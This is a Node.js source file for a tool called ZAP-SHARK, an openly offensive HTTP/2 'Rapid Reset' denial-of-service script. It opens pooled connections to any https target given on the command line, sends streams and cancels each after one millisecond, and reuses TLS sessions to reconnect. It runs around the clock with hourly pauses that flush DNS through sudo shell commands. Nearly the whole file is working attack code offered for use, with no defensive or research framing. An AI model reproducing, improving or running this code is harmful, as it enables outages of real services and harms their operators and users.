const http2 = require('http2');
const os = require('os');
const { exec } = require('child_process');
const tls = require('tls');

class ZAPSHARK {
    constructor(targetUrl) {
        this.targetUrl = targetUrl;
        this.host = new URL(targetUrl).hostname;
        this.status = "ATTACKING";
        this.totalRequests = 0;
        this.currentRPS = 0;
        this.startTime = Date.now();
        this.requestsSinceLastCalc = 0;
        this.lastRpsCalc = Date.now();
        this.running = true;
        
        // RAPID RESET ENGINE
        this.connectionPool = [];
        this.poolSize = 3; // Optimal for 24/7
        this.activeStreams = 0;
        this.maxStreams = 100;
        this.resetDelay = 1; // ms before RST_STREAM (RAPID RESET)
        
        // ZERO-RTT SESSION STORE
        this.tlsSessions = new Map();
        this.sessionTicketStore = [];
        
        // 24/7 MAINTENANCE TRACKING
        this.lastMaintenance = Date.now();
        this.maintenanceInterval = 3600000; // 1 hour
        this.maintenanceDuration = 600000;  // 10 minutes
        this.nextMaintenance = this.lastMaintenance + this.maintenanceInterval;
        
        // REAL METRICS TRACKING
        this.successfulReqs = 0;
        this.failedReqs = 0;
        this.realRPS = 0;
        this.lastRealUpdate = Date.now();
        
        this.attackInterval = null;
        this.metricsInterval = null;
        this.maintenanceTimer = null;
        
        console.log(`[ZAP-SHARK] Target: ${targetUrl}`);
        console.log(`[ZAP-SHARK] Next maintenance: ${new Date(this.nextMaintenance).toLocaleTimeString()}`);
    }

    async setupConnections() {
        // ZERO-RTT enabled connections
        for (let i = 0; i < this.poolSize; i++) {
            await this.createZeroRTTConnection(i);
            await this.delay(100); // Stagger connections
        }
    }

    createZeroRTTConnection(index) {
        return new Promise((resolve) => {
            try {
                const options = {
                    host: this.host,
                    ALPNProtocols: ['h2'],
                    servername: this.host,
                    session: this.tlsSessions.get(`${this.host}-${index % 3}`),
                    enableTrace: false
                };

                const client = http2.connect(this.targetUrl, options);
                
                // Store session for ZERO-RTT resumption
                client.on('session', (session) => {
                    this.tlsSessions.set(`${this.host}-${index}`, session);
                });

                client.on('connect', () => {
                    this.connectionPool.push(client);
                    console.log(`[ZAP-SHARK] Connection ${index+1} ready (Zero-RTT: ${options.session ? 'YES' : 'NO'})`);
                    resolve(true);
                });

                client.on('error', (err) => {
                    console.log(`[ZAP-SHARK] Connection ${index+1} error: ${err.code}`);
                    setTimeout(() => this.createZeroRTTConnection(index), 2000);
                    resolve(false);
                });

                client.on('goaway', () => {
                    setTimeout(() => this.createZeroRTTConnection(index), 1000);
                });

                // Track max streams from server
                client.on('remoteSettings', (settings) => {
                    if (settings.maxConcurrentStreams) {
                        this.maxStreams = Math.min(settings.maxConcurrentStreams, 1000);
                    }
                });

            } catch (err) {
                setTimeout(() => this.createZeroRTTConnection(index), 3000);
                resolve(false);
            }
        });
    }

    // RAPID RESET ATTACK IMPLEMENTATION
    sendRapidReset() {
        if (this.connectionPool.length === 0) return;

        const connections = this.connectionPool.length;
        const streamsPerTick = Math.min(this.maxStreams - this.activeStreams, connections * 5);
        
        for (let i = 0; i < streamsPerTick; i++) {
            const client = this.connectionPool[i % connections];
            if (!client || this.activeStreams >= this.maxStreams) break;

            this.activeStreams++;
            this.totalRequests++;
            this.requestsSinceLastCalc++;
            
            try {
                const req = client.request({
                    ':method': 'GET',
                    ':path': '/',
                    ':authority': this.host
                });

                // RAPID RESET: Cancel immediately
                setTimeout(() => {
                    try {
                        req.close(http2.constants.NGHTTP2_CANCEL); // RST_STREAM
                    } catch (e) {
                        // Stream already closed
                    }
                    this.activeStreams--;
                }, this.resetDelay);

                req.on('response', () => {
                    this.successfulReqs++;
                    req.destroy();
                    this.activeStreams--;
                });

                req.on('error', () => {
                    this.failedReqs++;
                    this.activeStreams--;
                });

                req.end();

            } catch (err) {
                this.activeStreams--;
                this.failedReqs++;
            }
        }
    }

    // REAL RPS CALCULATION
    calculateRealMetrics() {
        const now = Date.now();
        const timeDiff = (now - this.lastRealUpdate) / 1000;
        
        if (timeDiff >= 1.0) {
            this.realRPS = (this.successfulReqs + this.failedReqs) / timeDiff;
            this.successfulReqs = 0;
            this.failedReqs = 0;
            this.lastRealUpdate = now;
        }
    }

    updateDisplay() {
        const now = Date.now();
        const timeDiff = (now - this.lastRpsCalc) / 1000;
        
        if (timeDiff >= 0.9) {
            this.currentRPS = this.requestsSinceLastCalc / timeDiff;
            this.requestsSinceLastCalc = 0;
            this.lastRpsCalc = now;
        }

        this.calculateRealMetrics();
        
        const runtime = Math.floor((now - this.startTime) / 1000);
        const minutes = Math.floor(runtime / 60) % 60;
        const seconds = runtime % 60;
        const runtimeStr = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
        
        const timeToMaintenance = Math.max(0, this.nextMaintenance - now);
        const maintenanceMins = Math.floor(timeToMaintenance / 60000);
        const maintenanceSecs = Math.floor((timeToMaintenance % 60000) / 1000);
        
        process.stdout.write(
            `\rZAP-SHARK: (${runtimeStr}) | (${this.status}) ` +
            `TOTAL: ${this.totalRequests} | ` +
            `RPS: ${this.currentRPS.toFixed(1)} | ` +
            `REAL: ${this.realRPS.toFixed(1)} | ` +
            `NEXT-M: ${maintenanceMins.toString().padStart(2, '0')}:${maintenanceSecs.toString().padStart(2, '0')}`
        );
    }

    // 24/7 MAINTENANCE SYSTEM
    scheduleMaintenance() {
        const now = Date.now();
        const nextMaintenanceTime = this.lastMaintenance + this.maintenanceInterval;
        
        if (now >= nextMaintenanceTime && this.status === "ATTACKING") {
            this.executeMaintenance();
        }
        
        // Schedule next check
        this.maintenanceTimer = setTimeout(() => {
            this.scheduleMaintenance();
        }, 10000); // Check every 10 seconds
    }

    executeMaintenance() {
        console.log('\n[ZAP-SHARK] === MAINTENANCE STARTED (10 minutes) ===');
        this.status = "PAUSED";
        
        if (this.attackInterval) {
            clearInterval(this.attackInterval);
            this.attackInterval = null;
        }
        
        // Flush DNS
        if (os.platform() === 'win32') {
            exec('ipconfig /flushdns >nul 2>&1', () => {});
        } else {
            exec('sudo dscacheutil -flushcache 2>/dev/null || sudo systemd-resolve --flush-caches 2>/dev/null || true', () => {});
        }
        
        // Close all connections (they'll auto-reconnect with Zero-RTT)
        this.connectionPool.forEach(client => {
            try {
                client.destroy();
            } catch (e) {}
        });
        this.connectionPool = [];
        
        // Schedule resumption
        setTimeout(() => {
            this.resumeAttack();
        }, this.maintenanceDuration);
        
        this.lastMaintenance = Date.now();
        this.nextMaintenance = this.lastMaintenance + this.maintenanceInterval;
    }

    resumeAttack() {
        console.log('\n[ZAP-SHARK] === MAINTENANCE COMPLETE ===');
        console.log('[ZAP-SHARK] Reconnecting with Zero-RTT sessions...');
        
        this.status = "ATTACKING";
        
        // Reconnect using stored TLS sessions (Zero-RTT)
        this.setupConnections().then(() => {
            setTimeout(() => {
                this.startAttack();
                console.log(`[ZAP-SHARK] Next maintenance: ${new Date(this.nextMaintenance).toLocaleTimeString()}`);
            }, 2000);
        });
    }

    startAttack() {
        // RAPID RESET attack loop
        this.attackInterval = setInterval(() => {
            if (this.status === "ATTACKING") {
                this.sendRapidReset();
                this.updateDisplay();
            }
        }, 0.5); // Aggressive timing for max RPS
    }

    async start() {
        console.log('[ZAP-SHARK] === INITIALIZING ===');
        console.log('[ZAP-SHARK] Features: Rapid Reset + Zero-RTT');
        console.log('[ZAP-SHARK] Mode: 24/7 (Auto-maintenance)');
        console.log('='.repeat(50));
        
        await this.setupConnections();
        
        // Start attack after connections ready
        setTimeout(() => {
            this.startAttack();
            this.scheduleMaintenance();
            
            // Connection health monitor
            setInterval(() => {
                if (this.connectionPool.length < this.poolSize && this.status === "ATTACKING") {
                    console.log(`[ZAP-SHARK] Replenishing connections...`);
                    this.setupConnections();
                }
            }, 30000);
            
        }, 3000);
        
        // Handle graceful shutdown
        process.on('SIGINT', () => {
            console.log('\n[ZAP-SHARK] === GRACEFUL SHUTDOWN ===');
            this.cleanup();
            process.exit(0);
        });
        
        process.on('SIGTERM', () => {
            console.log('\n[ZAP-SHARK] === TERMINATED ===');
            this.cleanup();
            process.exit(0);
        });
    }

    cleanup() {
        this.running = false;
        if (this.attackInterval) clearInterval(this.attackInterval);
        if (this.maintenanceTimer) clearTimeout(this.maintenanceTimer);
        this.connectionPool.forEach(client => {
            try { client.destroy(); } catch (e) {}
        });
        console.log('[ZAP-SHARK] All connections closed');
    }

    delay(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }
}

// MAIN EXECUTION
const target = process.argv[2];
if (!target || !target.startsWith('https://')) {
    console.log('Usage: node zap-shark-v2.js https://target.com');
    process.exit(1);
}

const shark = new ZAPSHARK(target);
shark.start().catch(err => {
    console.error('[ZAP-SHARK] Fatal error:', err.message);
    process.exit(1);
});

// KEEP ALIVE - PREVENT EXIT
setInterval(() => {
    // Keep process alive
}, 86400000); // 24 hours
